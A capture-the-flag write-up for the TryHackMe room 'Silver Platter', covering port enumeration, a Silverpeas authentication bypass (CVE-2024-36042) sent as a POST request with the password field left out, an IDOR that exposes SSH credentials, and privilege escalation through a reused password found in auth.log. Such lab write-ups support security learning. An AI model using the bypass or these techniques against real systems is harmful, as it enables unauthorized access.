---
clayout: ctf
title: Silver Platter
type: TryHackMe
date: 2025-02-27
level: Easy
icon: /ctf/tryhackme/silver-platter/icon-room.png
image: /ctf/tryhackme/silver-platter/icon-room.png
description: Can you breach the server?
ctf-link: https://tryhackme.com/room/silverplatter
---



## Challenge description

Think you've got what it takes to outsmart the Hack Smarter Security team? They claim to be unbeatable, and now it's
your chance to prove them wrong. Dive into their web server, find the hidden flags, and show the world your elite
hacking skills. Good luck, and may the best hacker win!
But beware, this won't be a walk in the digital park. Hack Smarter Security has fortified the server against common
attacks and their password policy requires passwords that have not been breached (they check it against the rockyou.txt
wordlist - that's how 'cool' they are). The hacking gauntlet has been thrown, and it's time to elevate your game.
Remember, only the most ingenious will rise to the top.

May your code be swift, your exploits flawless, and victory yours!

## Challenge overview

Silver Platter is a **web exploitation** and **privilege escalation** challenge. The goal is to enumerate the services
running on the target, exploit a **vulnerable authentication mechanism in Silverpeas**, and escalate privileges using **leaked credentials**
to obtain **root access**.

## Enumeration

### Nmap

To begin, we perform a comprehensive scan of the target machine to identify open ports and services:

```bash
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 1b1c878afe3416c9f782372b108f8bf1 (ECDSA)
|_  256 266d17ed839e4f2df6cd5317c8803d09 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
| fingerprint-strings:
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Thu, 27 Feb 2025 11:56:56 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|_    Connection: close
|_http-title: Error
```

The scan reveals several open ports:

- **22/tcp**: SSH (OpenSSH 8.9p1 Ubuntu 3ubuntu0.4)
- **80/tcp**: HTTP (nginx 1.18.0)
- **8080/tcp**: HTTP Proxy

## Web enumeration

### Exploring Port 80

Navigating to `http://10.10.154.105` presents us with the home page of the Hack Smarter Security website:

![Hack Smarter Security](/ctf/tryhackme/silver-platter/home.png)

The website contains multiple pages:

- **Home**: Main page of the website.
- **Work**: Describes actions taken if payment is not made.
- **About Us**: Brief description of the company.
- **Contact**: Displays contact information.

On the **Contact** page, we find valuable information:

![Hack Smarter Security](/ctf/tryhackme/silver-platter/contact.png)

- Username: `scr1ptkiddy`
- Mention of [**Silverpeas**](https://www.silverpeas.com/) software

This information helps guide further enumeration.

### Investigating Port 8080

Navigating to `http://10.10.154.105:8080` results in a **404 error page**.

![404 Error](/ctf/tryhackme/silver-platter/404.png)

#### Silverpeas Login

Using the information gathered from the contact page, we can perform further enumeration. Looking at the documentation
of [silverpeas installation](https://www.silverpeas.org/installation/installation.html), we can see that the default
path for login is `/silverpeas`. Using this information, we can navigate to `http://10.10.154.105:8080/silvepeas` and
see a login page:

![Hack Smarter Security](/ctf/tryhackme/silver-platter/silverpeas-login.png)

## Exploiting Silverpeas Authentication Bypass

Using default credentials (`SilverAdmin:SilverAdmin`) **does not work**. Brute-force attempts also fail.

Searching for vulnerabilities, we
discover [CVE-2024-36042](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d), an **authentication
bypass** exploit. This allows login by simply **removing the password field** from the POST request:

```bash
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.10.182.212:8080
Content-Length: 28

Login=scr1ptkiddy&DomainId=0
```

This successfully logs in as `scr1ptkiddy`, granting access to the Silverpeas admin panel.

![Hack Smarter Security](/ctf/tryhackme/silver-platter/silverpeas-panel.png)

## Extracting SSH Credentials

Under **My Notifications**, we find an unread message from the **manager**.

![Hack Smarter Security](/ctf/tryhackme/silver-platter/unread-notification.png)

Changing the `ID` parameter in the URL (`id=6`), reveals an earlier **notification containing SSH credentials**.

![SSH credentials notification](/ctf/tryhackme/silver-platter/ssh-credentials.png)

Credentials:

```bash
tim:cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

Using these credentials, we SSH into the target machine and obtain the user flag.

```bash
ssh tim@10.10.182.212
tim@silver-platter:~$ ls -al
total 12
dr-xr-xr-x 2 root root 4096 Dec 13  2023 .
drwxr-xr-x 4 root root 4096 Dec 13  2023 ..
-rw-r--r-- 1 root root   38 Dec 13  2023 user.txt
tim@silver-platter:~$ cat user.txt
THM{user_flag}
```

## Privilege Escalation

### Enumerating Users

Checking `/etc/passwd` reveals another user, **tyler**:

```bash
tim@silver-platter:~$ cat /etc/passwd
[...]
tyler:x:1000:1000:root:/home/tyler:/bin/bash
tim:x:1001:1001::/home/tim:/bin/bash
```

### Finding Credentials for Tyler

Inspecting `/var/log/auth.log`, we see **Tyler running Docker commands**:

```bash
Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
```

Tyler's **PostgreSQL password**: `_Zd_zx7N823/`

Using this, we switch to **Tyler**:

```bash
tim@silver-platter:~$ su tyler
tyler@silver-platter:/home/tim$ whoami
tyler
```

## Root Privilege Escalation

### Checking Sudo Permissions

Checking the sudo permissions for the `tyler` user:

```bash
tyler@silver-platter:/home/tim$ sudo -l
[sudo] password for tyler:
Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
```

The `tyler` user can run any command as root. We can read the root flag:

```bash
tyler@silver-platter:/home/tim$ sudo cat /root/root.txt
THM{root_flag}
```
